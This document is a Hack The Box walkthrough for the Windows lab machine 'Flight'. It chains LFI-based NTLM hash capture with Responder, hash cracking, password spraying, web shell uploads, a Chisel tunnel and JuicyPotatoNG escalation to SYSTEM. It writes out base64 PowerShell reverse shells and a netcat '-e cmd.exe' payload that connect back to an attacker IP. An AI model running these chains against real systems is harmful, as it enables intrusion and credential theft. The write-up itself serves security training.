# Flight HTB machine

**A hard Windows machine that starts with a website with two different virtual hosts. One of them is
vulnerable to LFI and allows an attacker to retrieve an NTLM hash. It requires multiple skills such as enumeration, tunneling, kerberos authentication etc.**

The Nmap output reveals the system to be using Windows and the high number of open ports indicates that
this is a Domain Controller. At this point, we don't have any valid credentials for the machine so we turn our
attention over to port 80 where we find an Apache server running. Before we begin our enumeration we notice that the Nmap output reveals the hostname flight.htb , so we modify our /etc/hosts file accordingly.

Upon visiting http://flight.htb we are presented with a webpage that seems to be static and non-functional. We can use wfuzz to enumerate possible Vhosts that may exist using the "subdomains-top1million-20000.txt" dictionary.

```
wfuzz -c -w subdomains-top1million-20000.txt -u "http://10.10.11.187/" -H "Host: FUZZ.flight.htb" --hl 154
```

We have discovered a new vhost called "school", as indicated by the output of the command. Let's add this new entry to our /etc/hosts file.

Let's visit the new vhost. This time, the options Home , About Us and Blog are functional and use the ?view= paramater on index.php to load the correct page. By the structure of the url we can deduce that the HTML page to be displayed is included to index.php via the view parameter. This setup is usually vulnerable to Local File Inclusion (LFI) attacks. LFI vulnerabilities typically occur when a web application allows user-controlled input to be included as a file path without proper sanitization or validation.

To determine if LFI is possible, we need to examine the source code and the server-side implementation of the website. If the website allows arbitrary file inclusion without appropriate security measures, it could potentially be vulnerable to LFI.

```
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);  
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}
    
?>
```

The first two lines use the ini_set and error_reporting functions to configure error reporting settings. The code sets the display of errors to be turned off (display_errors = 0), but it enables reporting of critical errors, warnings, and parse errors (E_ERROR | E_WARNING | E_PARSE).

The code checks if the view parameter is set in the GET request using isset($_GET['view']).

If the view parameter is set, it assigns its value to the $file variable.

The code performs several checks to prevent potential security vulnerabilities:

It checks if the view parameter contains any instances of .. to prevent directory traversal attacks.
It checks if the view parameter contains the word "filter" to prevent potential filter bypass attempts.
It checks if the view parameter contains the backslash character (\) to prevent potential path manipulation attacks.
It checks if the view parameter contains the word "htaccess" to prevent access to sensitive server configuration files.
It checks if the view parameter contains the file extension ".shtml" to restrict file types that can be accessed.
If any of these checks fail, a message is displayed indicating that suspicious activity has been blocked, and it states that an incident will be reported.

If all the checks pass, the code uses the file_get_contents function to read and display the contents of the file specified by the view parameter.

If the view parameter is not set, meaning no specific view is requested, the code uses file_get_contents to read and display the contents of the "home.html" file located at "C:\xampp\htdocs\school.flight.htb\home.html". This serves as the default content for the page.

Usually, the filters detect the use of the \ character. On Windows though, we can still access a path if we replace the \ with /.

Let's try the path "C:/Windows/System32/drivers/etc/hosts" .

```
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
```

We see that we can see the contents of the file.  We can use this vulnerability to force the service to fetch a remote source using Windows network share syntax: //ip>/<share> and attempt to capture the hash of a service. We can use responder to get the ntlm hash.

```
python3 Responder.py -I tun0
```

-I tun0 specifies the network interface to use. In this case, it is set to tun0, which typically refers to a virtual network interface used for VPN connections.

In Linux, the Responder tool is a network analysis and attack tool specifically designed for capturing and analyzing network traffic. It is commonly used for performing Man-in-the-Middle (MitM) attacks and extracting sensitive information like usernames and passwords from network communications. we can find the responder script in the following repo: https://github.com/lgandx/Responder/releases/tag/v3.1.3.0

Then, request the following link, and make sure to replace the ip address with the suitable one:
http://school.flight.htb/index.php?view=//10.10.14.7/something/

Once the request is done, we should get the following event and its ntlm hash.

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:43dac5faaee2b738:0AB73BB6DD133A735691C87945408254:0101000000000000009881B705C6D90155DEA3913EE0E4D800000000020008005300530059004D0001001E00570049004E002D004F0032004D00530030004E0036004B00430039004A0004003400570049004E002D004F0032004D00530030004E0036004B00430039004A002E005300530059004D002E004C004F00430041004C00030014005300530059004D002E004C004F00430041004C00050014005300530059004D002E004C004F00430041004C0007000800009881B705C6D90106000400020000000800300030000000000000000000000000300000D6147C67828A1375F2CEFB7E31534A7DF803089D181DC64A0A622D826561EB080A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0037000000000000000000
```

We can try cracking the hash using hashcat:

```
hashcat -a 0 -m 5600 hash rockyou.txt
```

```
hashcat -a 0 -m 5600 hash rockyou.txt --show
```

The hash is cracked and the plaintext is "S@Ss!K@*t13". We can use crackmapexec to login as user "svc_apache" and try the password that we cracked. We can use crackmapexec to do this. Crackmapexec is a powerful post-exploitation tool used by penetration testers, red teamers, and security professionals to assess and navigate Windows networks after gaining initial access. It allows for various actions such as enumeration, credential attacks, and lateral movement.

```
crackmapexec smb flight.htb  -u svc_apache -p 'S@Ss!K@*t13'  --users
```

The command is attempting to enumerate users on the flight.htb host using the SMB protocol. It uses the svc_apache username and its corresponding password for authentication. The goal is to gather information about the user accounts present on the target system, which can be useful for further penetration testing and security assessment activities. We can try viewing the shares of the user and the permissions associated with them.

```
crackmapexec smb flight.htb  -u svc_apache -p 'S@Ss!K@*t13'  --shares
```

The goal of the command is to identify shared folders on the target system, which can provide insights into the file and resource sharing configuration and potential areas of interest for further assessment. Since, from the output of the command, we get that the user has only read permissions to the shares, we can continue trying to password spray the rest of the users. Since the account svc_apache was created to run the Apache service it totally plausible that the user who created this service account has re-used his personal password. We could try a password spray against the usernames that we have and check if the password for svc_apache is re-used.

```
crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

The command is performing a brute-force authentication attempt against the SMB service on the flight.htb host. It tries to authenticate using a list of usernames from the users.txt file, that can be created from the response of the previous commands, and the specified password. The --continue-on-success option ensures that the tool continues attempting to authenticate with other usernames even if it successfully authenticates with one of them.

We see that the user "S.Moon" has the same password as "svc_apache". Let's try logging in as "S.Moon".

```
crackmapexec smb flight.htb  -u s.moon -p 'S@Ss!K@*t13'  --shares
```

We notice that we now have WRITE access to the Shared share. Let's use smbclient to check
what's inside this share.

```
smbclient //flight.htb/shared -U S.moon
```

The command is using the smbclient tool to connect to an SMB share named shared on the flight.htb host. It attempts to authenticate using the username S.moon. Once connected, the tool will provide an interactive prompt that allows us to navigate and interact with the contents of the shared SMB share, such as listing files, downloading/uploading files, and performing various file operations.

The share is completely empty. Judging from the name of the share it is totally possible that many users access this share. In Windows, many files get automatically "executed" when they are placed inside a directory and that directory gets accessed. These files may point to a network share for a resource, forcing the machine to authenticate to access the resource. In fact, there is a tool called ntlm_theft that creates several files that could potentially be used to steal the NTLMv2 hash of a user just by accessing a folder. The tool ntlm_theft is primarily aimed at Penetration Testers and Red Teamers, who will use it to perform internal phishing on target company employees, or to mass test antivirus and email gateways. It may also be used for external phishing if outbound SMB access is allowed on the perimeter firewall.

We can create a desktop.ini file which will be pointing to our server’s address, and we can capture their hash using responder. So, first of all, download the tool from this repo: https://github.com/Greenwolf/ntlm_theft 
Then, we generate all files using the following command:

```
python3 ntlm_theft.py -g all -s 10.10.14.7 -f files
```

We should set up Responder to intercept any potential authentication requests. 

```
python3 Responder.py -I tun0
```

Then, we can connect again using smbclient and put the desktop.ini file into the shared folder with the following command:

```
put desktop.ini
```

```
[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:e12c4d154047f02c:E472485F25072E2B83E472CABD961C6C:010100000000000080C53B3524C7D901960AF346C9743440000000000200080050004E003200470001001E00570049004E002D0035004F00330059005A005200530046004E003400420004003400570049004E002D0035004F00330059005A005200530046004E00340042002E0050004E00320047002E004C004F00430041004C000300140050004E00320047002E004C004F00430041004C000500140050004E00320047002E004C004F00430041004C000700080080C53B3524C7D90106000400020000000800300030000000000000000000000000300000994EF364566A05D0A57372183F0AA5DCD5F9E55FC4CE05A6E4F7E023F8CFD7B00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0037000000000000000000
```

We can try cracking the hash using hashcat:

```
hashcat -a 0 -m 5600 hash2 rockyou.txt
```

```
hashcat -a 0 -m 5600 hash2 rockyou.txt --show
```

The hash is cracked and the plaintext is "Tikkycoll_431012284". Let's try listing the shares of the user c.bum.

```
crackmapexec smb flight.htb  -u c.bum -p 'Tikkycoll_431012284'  --shares
```

We notice that we now have READ access to the Users share and WRITE access to the Web share. Let's use smbclient to check what's inside the Users share.

```
smbclient //flight.htb/users -U c.bum
```

If we explore this share, we will find out that the user flag is under "Users/C.bum/Desktop". We can now display the content of the user flag using the following command:

```
more user.txt
```

Let's now use smbclient to check what's inside the Web share.

```
smbclient //flight.htb/web -U c.bum
``` 

It looks like we have write access to the web root folder of flight.htb and school.flight.htb. Let's upload a simple PHP shell named shell.php so that we can finally get code execution on the machine. We will use the p0wny shell, which can be used to quickly execute commands on a server when pentesting a PHP application: https://github.com/flozz/p0wny-shell

After downloading shell.php, we can put it in the Web share. We may need to reupload the shell, because it gets periodically deleted from the system.

```
put shell.php
```

Now, we can visit the shell, to establish a reverse shell with our computer: http://flight.htb/shell.php

This website has several reverse shell commands: https://www.revshells.com/

After providing the correct ip address and port number to the website, we can try the PowerShell #3 (Base64) option. First, start a listener with the following command:

```
nc -lnvp 4444
```

Now, execute the powershell command in the p0wny shell. The base64 encoded part of the command should be different, according to our ip and port number.

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

After establishing the reverse shell connection, we can execute:

```
whoami
```

We are logged in as "svc_apache" user. We can try executing the following command to view the TCP ports listening:

```
netstat -a
```

When we run this, we'll see a list of all network connections on our system, including established connections, listening ports, and other relevant information. This can be useful for troubleshooting network-related issues or simply gaining insight into the network activity on the machine.

From the output of the command, we can observe that port 8000 is in listening state. This means that we should further investigate the managing and organization of web content and services on the machine.

If we change directory using "cd /", we will see that there is a folder named "inetpub". The inetpub folder, often found on Windows operating systems, is a directory that serves as the default root location for web-related files and content hosted by the Internet Information Services (IIS) web server. IIS is Microsoft's web server software that allows us to host websites, web applications, and other web-related services on a Windows-based server. The name "inetpub" stands for "Internet Publisher" and is typically located on the system drive (usually C:\inetpub) in the file system hierarchy. The inetpub folder and its subdirectories are an essential part of the IIS infrastructure, and they provide a centralized location for managing and organizing web content and services.

After changing directory to inetpub using "cd /inetpub", we can check the permissions of all folders and files using the following command:

```
icacls *
```

The icacls command is a command-line utility in Windows that is used to manage permissions and security settings for files and folders. The name "icacls" stands for "Integrity Control Access Control List" (ACLs). ACLs are data structures that specify the permissions and access rights that users and groups have to specific objects, such as files and directories, in the Windows operating system.

After executing the command, we can observer from the following output that the user C.Bum has write access to the folder named "development".

```
development flight\C.Bum:(OI)(CI)(W)
            NT SERVICE\TrustedInstaller:(I)(F)
            NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(RX)
            BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

If we list the contents of the development folder, we will see that there are basic files with website content. So, that means that we need to switch from "svc_apache" to "c.bum" to try to write malicious shells to the "development" folder so we can achieve reverse shell. We can do that using "RunasCs". RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. We can find the "RunasCs.exe" file in the Releases section of the following github repository: https://github.com/antonioCoco/RunasCs

We should start listening into a new port.

```
nc -lnvp 4445
```

We can connect using smbclient to the Web share with C.bum user and put the RunasCs.exe file. After that we can execute the following command in our established reverse shell:

```
.\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.7:4445
```

We should get a new shell in the port 4445. We can now run "whoami" and check that we are user C.Bum. We can verify that we have write access by navigating to "C:\inetpub\development" folder and executing "echo test > test" and then "rm test".

Let's find a reverse shell to put in. Since this is an Internet Information Services (IIS) web server, we need to find a .aspx shell instead of a .php one. IIS natively supports .NET technologies, including ASP.NET, which uses the .aspx extension for web pages. Therefore, if the target web server is running IIS, it's logical to look for .aspx shells since they align with the technology stack.

We can download the following shell: https://github.com/jbarcia/Web-Shells/blob/master/laudanum/aspx/shell.aspx

We can try uploading the shell.aspx file in the development folder and then executing curl on the reverse shell, but we will soon find out that it does not work. We can use chisel to establish a reverse tunnel between a Chisel server and client.

Chisel is a tool used for creating TCP tunnels that allows us to access services or resources on a remote network securely. It is designed to bypass firewalls, NAT, and other network restrictions by creating a tunnel between a client and a server, facilitating communication over the tunnel as if the client and server were on the same local network.

Let's download the linux and windows executables of chisel from the Releases section of the following github repository: https://github.com/jpillora/chisel

Name "chisel" the executable for the linux machine and "chiselw.exe" the executable for the windows machine. Let's start a python server to fetch the executable. 

```
python3 -m http.server 8000
```

Go to the programdata folder, "cd /programdata", and execute the following command:

```
curl http://10.10.14.7:8000/chiselw.exe -o chiselw.exe
```

The ProgramData folder is a system-level directory in the Windows operating system that is used to store application data and settings that are shared across all users on the computer. It is intended for data that does not belong to a specific user and needs to be accessible to all users of the system. By putting chisel inside programdata folder, we ensure that it will be accesible by all users and it will not be periodically deleted.

Now, let's start a Chisel server on the local machine, which will listen for incoming connections from Chisel clients. The server is configured for a reverse tunnel, which means the clients initiate the connection to the server.

```
./chisel server --reverse -p 9999
```

Upload the reverse shell in the development folder. We may need to reupload it after a while, since it gets periodically deleted:

```
curl http://10.10.14.7:8000/shell.aspx -o shell.aspx
```

Now, go to programdata folder and start a Chisel client on the windows machine using the following command, which will establish a reverse tunnel to the Chisel server at the specified address and port.

```
./chiselw.exe client 10.10.14.7:9999 R:8002:127.0.0.1:8000
```

The local server listens for incoming connections from clients, and the client connects to the server and sets up a tunnel that forwards data between the server's port 8002 and the client's port 8000.

We can access now the shell by the following link: http://localhost:8002/shell.aspx

We can try submiting in the command field, a reverse shell from p0wny shell like before. We can change the port field to something unused, e.g 9002. First, we listen to that port and then  we submit the following reverse shell command in the field:

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAiACwAOQAwADAAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

Now, we should have established a shell with the user "iis apppool\defaultapppool".

Let's execute "whoami /all". The whoami /all command is a Windows command-line utility used to display information about the current user account in detail, including both the user's security identifier (SID) and group membership information. It provides an extensive list of attributes related to the user account, such as user name, security identifier, groups, privileges, logon session ID, and more.

From the output of the command, we can see the following privilege:

```
Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

This privilege is associated with a family of exploits known as "potatoes". We can read more about them
here: https://jlajara.gitlab.io/Potatoes_Windows_Privesc

Essentialy what we are trying to achieve is to force the machine to authenticate as NT AUTHORITY\SYSTEM to a process we control and then, because we have the SeImpersonatePrivilege, create a new process that runs as NT AUTHORITY\SYSTEM.

We can download the potatoe.exe file from the release section of the following github repository: https://github.com/antonioCoco/JuicyPotatoNG

To execute the privelege escalation successfully, we will need netcat. We can download the tool from here: https://nmap.org/download.html

Let's curl the program in the C:\Windows\Temp\ folder.

```
curl http://10.10.14.7:8000/nc64.exe -o nc.exe
```

Now, we need to transfer potatoe.exe into the machine. Using curl we might run into transfer issues. We can execute "put potatoe.exe" in the "flight.htb" folder from the smbclient connection as c.bum and then transfer the executable file from the reverse shell we established with p0wnyshell. We can move it into a public folder where we have minimal risk of getting the file periodically deleted. Go to the flight.htb folder using "cd /xampp/htdocs/flight.htb/"

```
mv potatoe.exe /Users/Public/
```

Start listener in port 6666:

```
nc -lnvp 6666
```

Then, using the shell as "iis apppool\defaultapppool", go to C:\Users\Public\ folder. We can execute the following command to do the privilege escalation and change the ip and port to the correct ones.

```
.\potatoe.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:\Windows\Temp\nc.exe 10.10.14.7 6666 -e cmd.exe"
```

Congrats! Now, we should have a new shell as "nt authority\system" user. Go to the "C:\Users\Administrator\Desktop\" folder and view the content of the flag "root.txt" by executing "more root.txt".
